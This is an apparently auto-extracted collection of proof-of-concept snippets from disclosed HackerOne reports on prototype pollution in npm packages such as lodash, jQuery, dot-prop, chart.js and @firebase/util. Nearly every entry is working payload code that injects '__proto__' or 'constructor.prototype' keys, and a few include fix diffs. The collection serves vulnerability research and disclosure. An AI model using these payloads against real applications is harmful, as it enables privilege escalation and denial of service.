# Prototype pollution — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #910206 property-expr - Prototype pollution — nodejs-ecosystem — - — Modification of Assumed-Immutable Data (MAID)
Source: `hackerone/reports/2020/910206.md` (https://hackerone.com/reports/910206)

```
let expr = require('property-expr')
obj = {}
expr.setter('constructor.prototype.isAdmin')(obj,true)
console.log({}.isAdmin) // true
```

## #1431042 Prototype pollution via console.table properties — nodejs — - — Modification of Assumed-Immutable Data (MAID)
Source: `hackerone/reports/2022/1431042.md` (https://hackerone.com/reports/1431042)

```
> console.table({a: 1, b: 1, c: 1}, ['__proto__'])
Uncaught TypeError: Cannot create property '0' on string ''

> Object.prototype
[Object: null prototype] { '0': '', '1': '', '2': '' }
```

```
 const keys = properties || ObjectKeys(item);
 for (const key of keys) {
+  if (key === '__proto__') {
+    continue
+  }
   if (map[key] === undefined)
     map[key] = [];
```

## #380873 Prototype pollution attack (lodash / constructor.prototype) — nodejs-ecosystem — - — Uncontrolled Resource Consumption
Source: `hackerone/reports/2018/380873.md` (https://hackerone.com/reports/380873)

```
var _ = require('lodash');
var payload = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
_.merge({}, payload);
console.log({}.isAdmin); // true
```

## #968355 [i18next] Prototype pollution attack — nodejs-ecosystem — - — Modification of Assumed-Immutable Data (MAID)
Source: `hackerone/reports/2021/968355.md` (https://hackerone.com/reports/968355)

```
// -------------- deepExtend as defined in i18next -------------- 
function deepExtend(target, source, overwrite) {
  /* eslint no-restricted-syntax: 0 */
  for (const prop in source) {
    if (prop !== '__proto__') {
      if (prop in target) {
        // If we reached a leaf string in target or source then replace with source or skip depending on the 'overwrite' switch
        if (
          typeof target[prop] === 'string' ||
          target[prop] instanceof String ||
          typeof source[prop] === 'string' ||
          source[prop] instanceof String
        ) {
          if (overwrite) target[prop] = source[prop];
        } else {
          deepExtend(target[prop], source[prop], overwrite);
        }
      } else {
        target[prop] = source[prop];
      }
    }
  }
  return target;
}
// --------------------------------------------------------------- 

const translations = '{ "constructor": { "prototype": { "polluted": true} } }';  
const existingData = {};                         
                                                  
deepExtend(existingData, JSON.parse(translations), true)

if ({}.polluted)
    console.log("Object is polluted")
```

```
    if (prop !== '__proto__') {
      if (prop in target) {
        // If we reached a leaf string in target or source then replace with source or skip depending on the 'overwrite' switch
        if (
          typeof target[prop] === 'string' ||
          target[prop] instanceof String ||
          typeof source[prop] === 'string' ||
          source[prop] instanceof String
        ) {
          if (overwrite) target[prop] = source[prop];
        } else {
          deepExtend(target[prop], source[prop], overwrite);
        }
      } else {
        target[prop] = source[prop];
      }
    }
```

```
                                                  
```

## #719856 Prototype pollution in dot-prop — nodejs-ecosystem — - — Modification of Assumed-Immutable Data (MAID)
Source: `hackerone/reports/2020/719856.md` (https://hackerone.com/reports/719856)

```
var dotProp = require("dot-prop")
const object = {};
console.log("Before " + object.b); //Undefined
dotProp.set(object, '__proto__.b', true);
console.log("After " + {}.b); //true
```

## #381194 Prototype pollution attack (merge.recursive) — nodejs-ecosystem — - — Uncontrolled Resource Consumption
Source: `hackerone/reports/2018/381194.md` (https://hackerone.com/reports/381194)

```
let merge = require('merge');
let payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge.recursive({}, payload);
console.log({}.isAdmin); // true
```

## #454365 Prototype pollution attack through jQuery $.extend — nodejs-ecosystem — - — Modification of Assumed-Immutable Data (MAID)
Source: `hackerone/reports/2019/454365.md` (https://hackerone.com/reports/454365)

```
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```

## #380878 Prototype pollution attack (defaults-deep / constructor.prototype) — nodejs-ecosystem — - — Uncontrolled Resource Consumption
Source: `hackerone/reports/2018/380878.md` (https://hackerone.com/reports/380878)

```
var defaultsDeep = require('defaults-deep');
var payload = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
defaultsDeep({}, payload);
console.log({}.isAdmin); // true
```

## #390860 Prototype Pollution Vulnerability in mpath Package — nodejs-ecosystem — - — None
Source: `hackerone/reports/2018/390860.md` (https://hackerone.com/reports/390860)

```
var mpath = require("mpath");
var obj = {
    comments: [
        { title: 'funny' },
        { title: 'exciting!' }
    ]
}
mpath.set('__proto__.x', ['hilarious', 'fruity'], obj);
console.log({}.x); 
```

```
    comments: [
        { title: 'funny' },
        { title: 'exciting!' }
    ]
```

## #381185 Prototype pollution attack (extend) — nodejs-ecosystem — - — Uncontrolled Resource Consumption
Source: `hackerone/reports/2018/381185.md` (https://hackerone.com/reports/381185)

```
let extend = require('extend');
let payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
extend(true, {}, payload);
console.log({}.isAdmin); // true
```

## #878339 [extend-merge] Prototype pollution — nodejs-ecosystem — - — Modification of Assumed-Immutable Data (MAID)
Source: `hackerone/reports/2020/878339.md` (https://hackerone.com/reports/878339)

```
const extend_merge = require('extend-merge');
const payload =  JSON.parse('{"__proto__":{"polluted":"yes"}}');
let obj = {};
console.log("Before : " + obj.polluted);
extend_merge.merge({}, payload);
console.log("After : " + obj.polluted);
```

```
Before : undefined
After : yes
```

## #980649 [json8-merge-patch] Prototype Pollution — nodejs-ecosystem — - — Modification of Assumed-Immutable Data (MAID)
Source: `hackerone/reports/2020/980649.md` (https://hackerone.com/reports/980649)

```
let json8mergepatch = require("json8-merge-patch");
var obj = {}
console.log("Before : " + obj.isAdmin);
json8mergepatch.apply(obj, JSON.parse('{ "__proto__": { "isAdmin": true }}'));
console.log("After : " + obj.isAdmin);
```

## #430291 Prototype pollution attack in just-extend — nodejs-ecosystem — - — Uncontrolled Resource Consumption
Source: `hackerone/reports/2018/430291.md` (https://hackerone.com/reports/430291)

```
var extend = require('just-extend');

var payload1 = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
extend(true, {}, payload1);
console.log({}.isAdmin); // true

var payload2 = JSON.parse('{"__proto__": {"isAdmin2": true}}');
extend(true, {}, payload2);
console.log({}.isAdmin2); // true
```

## #801522 [utils-extend] Prototype pollution  — nodejs-ecosystem — - — Modification of Assumed-Immutable Data (MAID)
Source: `hackerone/reports/2020/801522.md` (https://hackerone.com/reports/801522)

```
const { extend } = require('utils-extend');
const payload = '{"__proto__":{"isAdmin":true}}'
const emptyObject = {}
const pollutionObject = JSON.parse(payload);
extend({}, pollutionObject)
console.log(emptyObject.isAdmin)  // true
```

## #390857 Prototype Pollution Vulnerability in noble Package — nodejs-ecosystem — - — None
Source: `hackerone/reports/2021/390857.md` (https://hackerone.com/reports/390857)

```
var noble = require('noble');
//noble.emit("servicesDiscover");
console.log({}.x);
try {
    noble.onServicesDiscover("__proto__", "x");
} catch(e) {}
console.log({}.x);
```

```
    noble.onServicesDiscover("__proto__", "x");
```

## #430831 Prototype pollution attack in node.extend — nodejs-ecosystem — - — Uncontrolled Resource Consumption
Source: `hackerone/reports/2018/430831.md` (https://hackerone.com/reports/430831)

```
let extend = require('node.extend');
extend(true, {}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
console.log({}.isAdmin); // true
```

## #438274 Prototype pollution attack (smart-extend) — nodejs-ecosystem — - — None
Source: `hackerone/reports/2019/438274.md` (https://hackerone.com/reports/438274)

```
var extend = require('smart-extend');

var payload = '{"__proto__":{"polluted":"deep_done !"}}';
var test = {};
console.log("Before: ", test.polluted);
extend.deep({},JSON.parse(payload));
console.log("After: ", test.polluted);
```

```
Before:  undefined
After:  deep_done !
```

## #871156 [plain-object-merge] Prototype pollution — nodejs-ecosystem — - — Modification of Assumed-Immutable Data (MAID)
Source: `hackerone/reports/2021/871156.md` (https://hackerone.com/reports/871156)

```
const merge = require('plain-object-merge');
const payload =  JSON.parse('{"__proto__":{"polluted":"yes"}}');
const obj = {};
console.log("Before : " + obj.polluted);
merge([{}, payload]);
console.log("After : " + obj.polluted);
```

```
Before : undefined
After : yes
```

## #390847 Prototype Pollution Vulnerability in cached-path-relative Package — nodejs-ecosystem — - — Uncontrolled Resource Consumption
Source: `hackerone/reports/2018/390847.md` (https://hackerone.com/reports/390847)

```
var relative = require('cached-path-relative');
relative('__proto__', 'x');
console.log({}.x);
```

## #959987 [supermixer] Prototype pollution — nodejs-ecosystem — - — Modification of Assumed-Immutable Data (MAID)
Source: `hackerone/reports/2020/959987.md` (https://hackerone.com/reports/959987)

```
var mixer = require('supermixer');
var payload = '{"__proto__":{"poc":"evil"}}';
var test = {};
console.log("Before: ", test.poc);
mixer.merge({},JSON.parse(payload));
console.log("After: ", test.poc);
```

## #841380 Prototype pollution attack (lodash) — nodejs-ecosystem — - — Uncontrolled Resource Consumption
Source: `hackerone/reports/2020/841380.md` (https://hackerone.com/reports/841380)

```
const _ = require('lodash');

_.set({}, 'constructor.prototype.isAdmin', true);
console.log({}.isAdmin); // true

_.set({}, 'constructor.prototype.toString', null);
console.log({}.toString()); // crash
```

## #877515 [keyd] Prototype pollution — nodejs-ecosystem — - — Modification of Assumed-Immutable Data (MAID)
Source: `hackerone/reports/2020/877515.md` (https://hackerone.com/reports/877515)

```
const keyd = require('keyd');
const obj = {};
console.log("Before : " + obj.polluted);
keyd({}).set('__proto__.polluted', 'yes');
console.log("After : " + obj.polluted);
```

```
Before : undefined
After : yes
```

## #878394 [objtools] Prototype pollution — nodejs-ecosystem — - — Modification of Assumed-Immutable Data (MAID)
Source: `hackerone/reports/2020/878394.md` (https://hackerone.com/reports/878394)

```
const objtools = require('objtools');
const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
let obj = {};
console.log("Before : " + obj.polluted);
objtools.merge({}, payload);
console.log("After : " + obj.polluted);
```

```
Before : undefined
After : yes
```

## #776371 [chart.js] Prototype pollution — nodejs-ecosystem — - — Modification of Assumed-Immutable Data (MAID)
Source: `hackerone/reports/2020/776371.md` (https://hackerone.com/reports/776371)

```
        <canvas id="canvas"></canvas>
        <script src="node_modules/chart.js/dist/Chart.bundle.js"></script>
        <script>
            var ctx = document.getElementById('canvas').getContext('2d');
            var chart = new Chart(ctx, {
                type: 'line',
                data: {
                    labels: ['January', 'February', 'March', 'April', 'May'],
                    datasets: [{
                        label: 'My First dataset',
                        backgroundColor: 'rgb(255, 99, 132)',
                        borderColor: 'rgb(255, 99, 132)',
                        data: [0, 10, 5, 2, 20]
                    },
                    JSON.parse(`{"__proto__": {"abc": "Injected value through dataset"}}`)
                    ]
                },
                options: JSON.parse(`{"__proto__": {"def": "Injected value through options"}}`)
            });
            console.log({}.abc); // Print "Injected value through dataset"
            console.log({}.def); // Print "Injected value through options"
        </script>
```

```
diff --git a/src/helpers/helpers.core.js b/src/helpers/helpers.core.js
index 100d4edf..b5127025 100644
--- a/src/helpers/helpers.core.js
+++ b/src/helpers/helpers.core.js
@@ -226,7 +226,7 @@ export function _merger(key, target, source, options) {
 	var tval = target[key];
 	var sval = source[key];

-	if (isObject(tval) && isObject(sval)) {
+	if (Object.prototype.hasOwnProperty.call(target, key) && isObject(tval) && isObject(sval)) {
 		// eslint-disable-next-line no-use-before-define
 		merge(tval, sval, options);
 	} else {
```

## #878332 [object-path-set] Prototype pollution — nodejs-ecosystem — - — Modification of Assumed-Immutable Data (MAID)
Source: `hackerone/reports/2020/878332.md` (https://hackerone.com/reports/878332)

```
const setPath = require('object-path-set');
const obj = {};
console.log("Before : " + obj.polluted);
setPath({}, '__proto__.polluted', 'yes');
console.log("After : " + obj.polluted);
```

```
Before : undefined
After : yes
```

## #1001218 [@firebase/util] Prototype pollution — nodejs-ecosystem — - — None
Source: `hackerone/reports/2020/1001218.md` (https://hackerone.com/reports/1001218)

```
const utils = require('@firebase/util');

const obj = {};
const source = JSON.parse('{"__proto__":{"polluted":"yes"}}');
console.log("Before : " + obj.polluted);
utils.deepExtend({}, source);
// utils.deepCopy(source);
console.log("After : " + obj.polluted);
```

```
Before : undefined
After : yes
```

